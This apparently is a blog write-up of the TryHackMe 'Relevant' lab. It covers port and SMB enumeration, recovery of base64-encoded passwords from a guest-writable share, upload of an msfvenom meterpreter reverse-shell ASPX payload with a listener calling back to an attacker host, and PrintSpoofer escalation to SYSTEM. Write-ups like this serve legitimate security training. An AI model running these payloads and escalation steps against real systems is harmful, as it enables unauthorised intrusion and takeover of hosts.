---
title: TryHackMe - Relevant
date: 2024-07-08T14:32:00
categories:
  - Posts
  - TryHackMe
tags:
  - TryHackMe
  - SMB
  - SEImpersonate
  - PrintSpoofer
  - Windows
---
![Pasted image 20240708112244.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240708112244.png)
## Summary
Take advantage of an open SMB share
Abuse SEImpersonate privileges
## Enumeration
#### Port Scanning
As always, I start off the enumeration with nmap. I wouldn't typically scan all the ports but after getting stuck enumerating the top ports, I came back and found three additional ports open. To save some time, we can do this in two steps.
```
$ nmap -p- -T4 10.10.6.212 

PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49663/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown

$ nmap -sC -sV -T4 -p80,135,139,445,3389,49663,49667,49669 10.10.6.212

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2016 Standard Evaluation 14393 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2024-01-25T19:30:10+00:00; +6s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RELEVANT
|   NetBIOS_Domain_Name: RELEVANT
|   NetBIOS_Computer_Name: RELEVANT
|   DNS_Domain_Name: Relevant
|   DNS_Computer_Name: Relevant
|   Product_Version: 10.0.14393
|_  System_Time: 2024-01-25T19:29:30+00:00
| ssl-cert: Subject: commonName=Relevant
| Not valid before: 2024-01-24T18:40:05
|_Not valid after:  2024-07-25T18:40:05
49663/tcp open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard Evaluation 14393 (Windows Server 2016 Standard Evaluation 6.3)
|   Computer name: Relevant
|   NetBIOS computer name: RELEVANT\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-01-25T11:29:33-08:00
| smb2-time: 
|   date: 2024-01-25T19:29:34
|_  start_date: 2024-01-25T18:40:06
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h36m06s, deviation: 3h34m41s, median: 5s
```

Let's go through the ports in order.
#### Port 80
![Pasted image 20240708114908.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240708114908.png)
We visit the http site on Firefox and it appears to be a fresh install of IIS. Let's run gobuster and see if we have access to anything interesting.
```
$ gobuster dir -u http://10.10.6.212 -w /usr/share/dirb/wordlists/directory-list-2.3-medium.txt
```

The tool finished without any results so we'll move on.
#### SMB
The standard SMB ports are open, so I enumerate the shares with an NSE script.
```
$ nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.6.212
Host script results:
| smb-enum-shares: 
|   account_used: guest
|   \\10.10.6.212\ADMIN$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Remote Admin
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.6.212\C$: 
|     Type: STYPE_DISKTREE_HIDDEN
|     Comment: Default share
|     Anonymous access: <none>
|     Current user access: <none>
|   \\10.10.6.212\IPC$: 
|     Type: STYPE_IPC_HIDDEN
|     Comment: Remote IPC
|     Anonymous access: <none>
|     Current user access: READ/WRITE
|   \\10.10.6.212\nt4wrksv: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Anonymous access: <none>
|_    Current user access: READ/WRITE
```

As you can see, we have guest access to the IPC and nt4wrksv shares. Let's connect and see what we can find. 
```
$ smbclient //10.10.6.212/IPC$ -U guest
```
There doesn't appear to be anything on the IPC share so we'll try the nt4wrksv share.
Here we find a file passwords.txt so we'll download that and examine it on our host machine.
```
smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit

$ cat passwords.txt                       
[User Passwords - Encoded]
Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk 
```
These appear to be base64 encoded.
```
$ echo Qm9iIC0gIVBAJCRXMHJEITEyMw== | base64 -d                  
Bob - *************

$ echo QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk | base64 -d                  
Bill - *************
```
Now we have credentials for users Bob and Bill. This conveniently takes us to the RDP port that we saw open and we'll try to login with these credentials.
#### RDP
Using xfreerdp to attempt authentication with our newfound credentials
```
$ xfreerdp /u:Bill /v:10.10.6.212
```
Neither set of credentials allowed us to login so we'll move on to the next port in our list. 
#### Port 49663
![Pasted image 20240708115058.png](https://raw.githubusercontent.com/sullydan/sullydan.github.io/main/assets/images/Pasted%20image%2020240708115058.png)
Once again, it appears to be a default install of IIS. Let's run gobuster again and see if we get different results.
```
$ gobuster dir -u http://10.10.6.212:49663 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt 
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3420]
/*docroot*            (Status: 400) [Size: 3420]
/*                    (Status: 400) [Size: 3420]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]
/http%3A              (Status: 400) [Size: 3420]
/q%26a                (Status: 400) [Size: 3420]
/**http%3a            (Status: 400) [Size: 3420]
/*http%3A             (Status: 400) [Size: 3420]
/**http%3A            (Status: 400) [Size: 3420]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]
/s%26p                (Status: 400) [Size: 3420]
/%3FRID%3D2671        (Status: 400) [Size: 3420]
/devinmoore*          (Status: 400) [Size: 3420]
/200109*              (Status: 400) [Size: 3420]
/*sa_                 (Status: 400) [Size: 3420]
/*dc_                 (Status: 400) [Size: 3420]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]
/q%26a2               (Status: 400) [Size: 3420]
/login%3f             (Status: 400) [Size: 3420]
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3420]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3420]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3420]
/http%3A%2F%2Fswik    (Status: 400) [Size: 3420]
/nt4wrksv             (Status: 301) [Size: 159] [--> http://10.10.6.212:49663/nt4wrksv/]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```
The last result proves to be interesting as it the same name as the SMB share we saw earlier. Upon visiting, we get a blank screen but if we append with the passwords.txt filename we get the encoded passwords. Now that we know this is the same share, we can take advantage of this to get a shell.
## Exploitation
Now that we know we have access to the nt4wrksv share through the webserver, let's create a reverse shell and upload it through SMB. 
```
$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost={attacker IP} lport=4444 -f aspx > shell.aspx
$ smbclient //10.10.6.212/nt4wrksv -U guest
smb: \> put shell.aspx
```
Next, setup our listener before sending a GET request to our uploaded shell.
```
$ msfconsole
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_tcp
msf6 exploit(multi/handler) > set lhost {attacker IP}
msf6 exploit(multi/handler) > set lport 4444
msf6 exploit(multi/handler) > run
```
In a separate terminal window
```
$ curl http://10.10.11.52:49663/nt4wrksv/shell.aspx`
```
Meterpreter session1 opened!
We can now start poking around. I immediately went to the `C:\Users` directory to look for the user flag. We have full access to Bob's user folder and therein lies the user flag on his Desktop. 
## Privilege Escalation
Let's enumerate our current priviledges.
```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
With the SeImpersonatePrivilege, we should be able to elevate to SYSTEM with the PrintSpoofer tool. For more info, see https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
From our meterpreter session we can upload the 64-bit exe.
```
meterpreter > upload /opt/PrintSpoofer/PrintSpoofer/PrintSpoofer64.exe
```
Drop down into a cmd shell with the 'shell' command.
```
C:\Temp>PrintSpoofer64.exe -i -c cmd
PrintSpoofer64.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
```
We got system! All that's left to do is navigate over to the Administrator's Desktop and grab the root flag. 